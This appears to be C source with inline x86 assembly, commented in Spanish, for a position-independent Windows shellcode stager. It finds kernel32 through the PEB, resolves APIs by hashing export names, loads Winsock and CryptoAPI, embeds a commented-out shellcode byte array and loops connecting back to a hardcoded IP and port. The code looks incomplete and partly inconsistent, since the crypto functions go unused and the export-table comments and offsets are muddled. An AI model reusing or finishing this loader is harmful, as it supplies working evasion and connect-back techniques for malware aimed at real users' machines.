#pragma optimize("gsy", on)
#pragma comment(linker, "/NODEFAULTLIB")
#pragma comment(linker, "/ENTRY:main")

//COMPILACION CONDICIONADA!!
#define SHELLCODE
#undef SHELLCODE

#include <Windows.h>
#include "Macros.h"

//CONSTANTES DE ERROR
#define ERR_NO	0x0			//No hay error
#define ERR_FNC	0x1			//Error en LoadFunctions
#define ERR_HST 0x2			//Error al resolver el Hostname

DWORD FindFunction(DWORD BaseAddress,DWORD FunctionHash);
DWORD LoadFunctions(DWORD BaseAddress,DWORD lpHashes,DWORD numHashes);
void gtfo();

/*Se declaran las constantes con el formato "_%NombreAPI%" el valor es la posición de la dirección del API en el stack*/
CREATE_IDS(
			/*kernel32*/	(LoadLibraryA) (ExitProcess) (VirtualAlloc) (VirtualFree)
			/*ws2_32*/		(WSASocketA) (connect) (WSAStartup) (closesocket) (send) (inet_addr) (gethostbyname) (recv)
			/*advapi32*/	(CryptAcquireContextA) (CryptCreateHash) (CryptHashData) (CryptDeriveKey) (CryptEncrypt)
			/*variables*/	(hSocket) (Delta)
		   )

void __declspec(naked) main(){
	__asm{
		jmp  start
		//SHELLCODE IAT de Ark
		//EMIT_BYTE_ARRAY((0x55)(0x89)(0xE5)(0x60)(0xE8)(0x00)(0x00)(0x00)(0x00)(0x5E)(0x81)(0xEE)(0x09)(0x10)(0x40)(0x00)(0x8B)(0x55)(0x08)(0x8B)(0x5A)(0x0C)(0x89)(0x9E)(0x62)(0x11)(0x40)(0x00)(0x8B)(0x5A)(0x10)(0x89)(0x9E)(0x6E)(0x11)(0x40)(0x00)(0x8B)(0x5A)(0x14)(0x89)(0x9E)(0x68)(0x11)(0x40)(0x00)(0xFF)(0x32)(0xE8)(0x1E)(0x00)(0x00)(0x00)(0x50)(0xFF)(0x32)(0xE8)(0x58)(0x00)(0x00)(0x00)(0x8B)(0x5A)(0x04)(0x21)(0xDB)(0x75)(0x03)(0x8B)(0x58)(0x28)(0x03)(0x1A)(0xFF)(0x72)(0x08)(0xFF)(0xD3)(0x61)(0xC9)(0xC2)(0x04)(0x00)(0x55)(0x89)(0xE5)(0x52)(0x57)(0x8B)(0x55)(0x08)(0x66)(0x81)(0x3A)(0x4D)(0x5A)(0x75)(0x12)(0x8B)(0x42)(0x3C)(0x8D)(0x3C)(0x10)(0x81)(0x3F)(0x50)(0x45)(0x00)(0x00)(0x75)(0x04)(0x89)(0xF8)(0xEB)(0x02)(0x31)(0xC0)(0x5F)(0x5A)(0xC9)(0xC2)(0x04)(0x00)(0x55)(0x89)(0xE5)(0x53)(0x8B)(0x45)(0x0C)(0x8B)(0x5D)(0x10)(0xC1)(0xE3)(0x03)(0x8B)(0x44)(0x18)(0x78)(0x03)(0x45)(0x08)(0x5B)(0xC9)(0xC2)(0x0C)(0x00)(0x55)(0x89)(0xE5)(0x83)(0xEC)(0x14)(0x60)(0x6A)(0x01))
		//EMIT_BYTE_ARRAY((0xFF)(0x75)(0x0C)(0xFF)(0x75)(0x08)(0xE8)(0xD3)(0xFF)(0xFF)(0xFF)(0x89)(0x45)(0xF4)(0x89)(0xC3)(0x8B)(0x43)(0x0C)(0x85)(0xC0)(0x0F)(0x84)(0xA3)(0x00)(0x00)(0x00)(0x03)(0x45)(0x08)(0x50)(0x89)(0x55)(0xFC)(0x89)(0x4D)(0xF8)(0xE8)(0x99)(0x00)(0x00)(0x00)(0x8B)(0x55)(0xFC)(0x8B)(0x4D)(0xF8)(0x89)(0xC2)(0x8B)(0x33)(0x8B)(0x7B)(0x10)(0x03)(0x75)(0x08)(0x03)(0x7D)(0x08)(0x8D)(0x45)(0xF0)(0x50)(0x6A)(0x04)(0x68)(0x00)(0x10)(0x00)(0x00)(0x57)(0x89)(0x55)(0xFC)(0x89)(0x4D)(0xF8)(0xE8)(0x75)(0x00)(0x00)(0x00)(0x8B)(0x55)(0xFC)(0x8B)(0x4D)(0xF8)(0x31)(0xC9)(0xF7)(0x04)(0x0E)(0xFF)(0xFF)(0xFF)(0xFF)(0x74)(0x32)(0x8B)(0x04)(0x0E)(0xA9)(0x00)(0x00)(0x00)(0x80)(0x75)(0x08)(0x03)(0x45)(0x08)(0x8D)(0x40)(0x02)(0xEB)(0x05)(0x25)(0xFF)(0xFF)(0xFF)(0x7F)(0x50)(0x52)(0x89)(0x55)(0xFC)(0x89)(0x4D)(0xF8)(0xE8)(0x46)(0x00)(0x00)(0x00)(0x8B)(0x55)(0xFC)(0x8B)(0x4D)(0xF8)(0x89)(0x04)(0x0F)(0x83)(0xC1)(0x04)(0xEB)(0xC5)(0x8D)(0x45)(0xF0)(0x50)(0xFF)(0x30)(0x68)(0x00)(0x10)(0x00)(0x00)(0x8B)(0x03)(0x57)(0x89)(0x55)(0xFC)(0x89)(0x4D)(0xF8)(0xE8)(0x19)(0x00)(0x00)(0x00)(0x8B)(0x55)(0xFC)(0x8B)(0x4D)(0xF8)(0x8D)(0x5B)(0x14)(0xE9)(0x52)(0xFF)(0xFF)(0xFF)(0x61)(0xC9)(0xC2)(0x08)(0x00)(0x68)(0x00)(0x00)(0x00)(0x00)(0xC3)(0x68)(0x00)(0x00)(0x00)(0x00)(0xC3)(0x68)(0x00)(0x00)(0x00)(0x00)(0xC3))
IP:		EMIT_BYTE_ARRAY(('1') ('2') ('7') ('.') ('0') ('.') ('0') ('.') ('1')(0))
PORT:	EMIT_DWORD(0xD0070002)
//HASH:	EMIT_BYTE_ARRAY()
		kernel32_symbol_hashes:
		
		#define kernel32_count	4
		/*LoadLibraryA*/		HASH_AND_EMIT(('L') ('o') ('a') ('d') ('L') ('i') ('b') ('r') ('a') ('r') ('y') ('A'))
		/*ExitProcess*/			HASH_AND_EMIT(('E') ('x') ('i') ('t') ('P') ('r') ('o') ('c') ('e') ('s') ('s'))
		/*VirtualAlloc*/		HASH_AND_EMIT(('V') ('i') ('r') ('t') ('u') ('a') ('l') ('A') ('l') ('l') ('o') ('c'))
		/*VirtualFree*/			HASH_AND_EMIT(('V') ('i') ('r') ('t') ('u') ('a') ('l') ('F') ('r') ('e') ('e'))

		ws2_32_symbol_hashes:

		#define ws2_32_count	8
		/*WSASocketA*/			HASH_AND_EMIT(('W') ('S') ('A') ('S') ('o') ('c') ('k') ('e') ('t') ('A'))
		/*connect*/				HASH_AND_EMIT(('c') ('o') ('n') ('n') ('e') ('c') ('t'))
		/*WSAStartup*/			HASH_AND_EMIT(('W') ('S') ('A') ('S') ('t') ('a') ('r') ('t') ('u') ('p'))
		/*closesocket*/			HASH_AND_EMIT(('c') ('l') ('o') ('s') ('e') ('s') ('o') ('c') ('k') ('e') ('t'))
		/*send*/				HASH_AND_EMIT(('s') ('e') ('n') ('d'))
		/*inet_addr*/			HASH_AND_EMIT(('i') ('n') ('e') ('t') ('_') ('a') ('d') ('d') ('r'))
		/*gethostbyname*/		HASH_AND_EMIT(('g') ('e') ('t') ('h') ('o') ('s') ('t') ('b') ('y') ('n') ('a') ('m') ('e'))
		/*recv*/				HASH_AND_EMIT(('r') ('e') ('c') ('v'))

		advapi32_symbol_hashes:

		#define advapi32_count	5
		/*CryptAcquireContextA*/HASH_AND_EMIT( ('C') ('r') ('y') ('p') ('t') ('A') ('c') ('q') ('u') ('i') ('r') ('e') ('C') ('o') ('n') ('t') ('e') ('x') ('t') ('A') )
		/*CryptCreateHash*/		HASH_AND_EMIT( ('C') ('r') ('y') ('p') ('t') ('C') ('r') ('e') ('a') ('t') ('e') ('H') ('a') ('s') ('h') )
		/*CryptHashData*/		HASH_AND_EMIT( ('C') ('r') ('y') ('p') ('t') ('H') ('a') ('s') ('h') ('D') ('a') ('t') ('a') )
		/*CryptDeriveKey*/		HASH_AND_EMIT( ('C') ('r') ('y') ('p') ('t') ('D') ('e') ('r') ('i') ('v') ('e') ('K') ('e') ('y') )
		/*CryptEncrypt*/		HASH_AND_EMIT( ('C') ('r') ('y') ('p') ('t') ('E') ('n') ('c') ('r') ('y') ('p') ('t') )

start:
		//Reservamos espacio en la pila para las direcciones de las apis
		sub  esp, STACKSIZE
		//Usamos ebp como puntero al inicio del buffer donde se guardarán las apis
		//para así poder llamarlas en cualquier punto del programa
		mov  ebp, esp

#ifdef SHELLCODE
		//Sacamos el delta y lo guardamos
find_delta:
		fldz
		EMIT_BYTE_ARRAY((0xD9)(0x74)(0x24)(0xF4))	//fstenv SS:[esp-0x0C] (Para evitar el OPCODE innecesario hardcodeo la instruccion)
		pop  edi
		sub  edi, find_delta
		mov  [ebp+_Delta], edi			//Lo guardamos para luego :)
#endif

		//Obtenemos en eax la dirección de KERNEL32.DLL
find_kernel32:
		xor  eax, eax
		mov  esi, FS:[eax+0x30]			//ESI = &(PEB)
		mov  esi, [esi+0x0C]			//ESI = PEB->Ldr
		mov  esi, [esi+0x1C]			//ESI = PEB->Ldr.InInitOrder[0]
next_module:
		mov  eax, [esi+0x08]			//EAX = PEB->Ldr.InInitOrder[X].base_address
		mov  ecx, [esi+0x20]			//EDI = PEB->Ldr.InInitOrder[X].module_name (unicode)
		cmp  [ecx+0xC], '3'				//module_name[6] == '3'?
		je   find_kernel32_finished
		mov  esi, [esi]					//ESI = PEB->Ldr.InInitOrder[X].flink == NextModule
		jmp  next_module
find_kernel32_finished:

		//Cargamos las apis de kernel32 en la pila a partir de los hashes
		push kernel32_count				//Numero de hashes
		pushr(kernel32_symbol_hashes)	//Puntero al primer hash
		push eax						//Kernel32 BaseAddress
		call LoadFunctions

		//Obtenemos el BaseAddress de ws2_32
		push '23'						//push "32\0\0"
		push '_2sw'						//push "ws2_"
		push esp						//ESP = "ws2_32"
		call [ebp+_LoadLibraryA]		//call LoadLibraryA
		add  esp, 0x8					//Restauramos la pila
		add  ebp, (kernel32_count*4)	//Desplazamos el buffer para no pisar los punteros a las apis de kernel32
		push ws2_32_count				//Numero de Hashes
		pushr(ws2_32_symbol_hashes)		//Puntero al primer hash de ws2_32.dll
		push eax						//ws_32.dll BaseAddress
		call LoadFunctions
		sub  ebp, (kernel32_count*4)	//Lo restauramos al inicio del stack de APIs

		//Obtenemos el BaseAddress de advapi32
		cdq								//EDX = 0
		push edx						//push 0
		push '23ip'						//push "pi32"
		push 'avda'						//push "adva"
		push esp						//ESP = "advapi32"
		call [ebp+_LoadLibraryA]		//call LoadLibraryA
		add  esp, 0xC					//Restauramos la pila
		//Desplazamos el buffer para no pisar los punteros a las apis de kernel32 ni ws2_32
		add  ebp, (kernel32_count*4)+(ws2_32_count*4)
		push advapi32_count				//Numero de Hashes
		pushr(advapi32_symbol_hashes)	//Puntero al primer hash de advapi32
		push eax						//advapi32 BaseAddress
		call LoadFunctions
		//Lo restauramos al inicio del stack de APIs
		sub  ebp, (kernel32_count*4)+(ws2_32_count*4)

		//Llamamos a WSAStartup
		sub  esp, 0x190					//Reservamos espacio en la pila para WSADATA
		push esp                        //ESP = lpWSADATA
		push 0x202						//VersionRequested (2.2)
		call [ebp+_WSAStartup]			//call WSAStartup
		add  esp, 0x190					//Restauramos la pila

newSocket:
		cdq								//EDX = 0	(Si EAX >=0; WSAStartup siempre devuelve >=0)
		push edx						//push 0
		push edx						//push 0
		push edx						//push 0
		push edx						//push 0
		inc  edx						//EDX = 1 (SOCK_STREAM)
		push edx						//push SOCK_STREAM
		inc	 edx						//EDX = 2 (AF_INET)
		push edx						//push AF_INET
		call [ebp+_WSASocketA]			//call WSASocketA
		mov  [ebp+_hSocket], eax		//hSocket = EAX

		pushr(IP)
		call [ebp+_gethostbyname]		//call gethostbyname
		test eax, eax
		jne  NoErr						//Si fallamos al obtener el host mejor salimos...
		push ERR_HST
		call gtfo
NoErr:	add  eax, 0x20					//EAX = hostent.h_name
		push eax
		call [ebp+_inet_addr]			//call inet_addr
		//Construimos la sockaddr_in en la pila
		push eax						//push IP
		pushr(PORT)						//push PORT
		pop  eax
		push [eax]
		mov  ebx, esp					//EBX = &sockaddr_in
BucleConectar:
		push 0x10						//push size(sockaddr_in)
		push ebx					    //push &sockaddr_in
		push [ebp+_hSocket]				//push hSocket
		call [ebp+_connect]				//call connect
		test eax, eax
		jl   BucleConectar
		add  esp, 0x8					//Reparamos la pila
salida:
		push ERR_NO
		call gtfo
	}
}

DWORD __declspec(naked) LoadFunctions(DWORD BaseAddress, DWORD lpHashes, DWORD numHashes){
	__asm{
		pushad
		mov  ebx, [esp+0x24]			//BaseAddress
		mov  esi, [esp+0x28]			//lpHashes
		mov  ecx, [esp+0x2C]			//numHashes

		lea  edi, [ebp+0x04]			//EDI = lpBuffer
		cdq								//EDX = 0
NextFunction:
		xor  eax, eax					//EAX = 0
		lodsw							//mov ax, WWORD[esi]; esi+=2
		push eax						//FunctionHash
		push ebx						//BaseAddress
		call FindFunction
		test eax, eax
		jnz  NoErr
		push ERR_FNC
		call gtfo						//SALIMOS dando error ERR_FNC
NoErr:	mov  [edi+edx*4], eax			//Guardamos dir en buffer pila

		inc  edx						//EDX++
		dec  ecx						//ECX--
		jnz  NextFunction

		popad
		ret 0xC
	}
}

DWORD __declspec(naked) FindFunction(DWORD BaseAddress,DWORD FunctionHash){
	__asm{
find_function:
		pushad
		mov  ebp, [esp+0x24]			//EBP = &IMAGE_DOS_HEADER
		mov  eax, [ebp+0x3C]			//EAX = IMAGE_DOS_HEADER.e_lfanew
		mov  edi, [ebp+eax+0x78]		//EDI = IMAGE_OPTIONAL_HEADER->DataDirectory(IMAGE_FILE_EXPORT_DIRECTORY).VirtualAddress
		add  edi, ebp					//EDI = EAT (RVA)
		mov  ecx, [edi+0x18]			//ECX = IMAGE_EXPORT_DIRECTORY.NumberOfFunctions
		mov  ebx, [edi+0x20]			//EBX = IMAGE_EXPORT_DIRECTORY.AddressOfFunctions (RVA)
		add  ebx, ebp					//EBX = IMAGE_EXPORT_DIRECTORY.AddressOfFunctions (VA)
find_function_loop:
		jecxz find_function_finished	//Si ECX == 0 ya no quedan funciones por recorrer
		dec  ecx						//ECX--
		mov  esi, [ebx+ecx*4]			//ESI = IMAGE_EXPORT_DIRECTORY.AddressOfFunctions[X] (RVA)
		add  esi, ebp					//ESI = IMAGE_EXPORT_DIRECTORY.AddressOfNames[X] (VA) Export Name Table
compute_hash:
		cdq								//EDX = 0
		cld								//Clear Direction Flag
compute_hash_again:
		xor  eax, eax					//EAX = 0
		lodsb							//AL = BYTE[ESI] //ESI++
		test al, al
		jz   compute_hash_finished
		shr  edx, 1
		shl  eax, 7
		xor  edx, eax
		jmp  compute_hash_again
compute_hash_finished:
find_function_compare:
		cmp  dx, WORD PTR DS:[esp+0x28]	//Comparamos el Hash con FunctionHash
		jnz  find_function_loop
		mov  ebx, [edi+0x24]			//EBX = IMAGE_EXPORT_DIRECTORY.AddressOfNames (RVA)
		add  ebx, ebp					//EBX = IMAGE_EXPORT_DIRECTORY.AddressOfNames (VA)
		mov  cx, [ebx+ecx*2]
		mov  ebx, [edi+0x1C]
		add  ebx, ebp
		mov  eax, [ebx+4*ecx]
		add  eax, ebp
find_function_finished:
		mov  [esp+0x1C], eax
		popad
		ret 0x8
	}
}

void __declspec(naked) gtfo(){
	__asm{
		push [esp+4]
		call [ExitProcess]
	}
}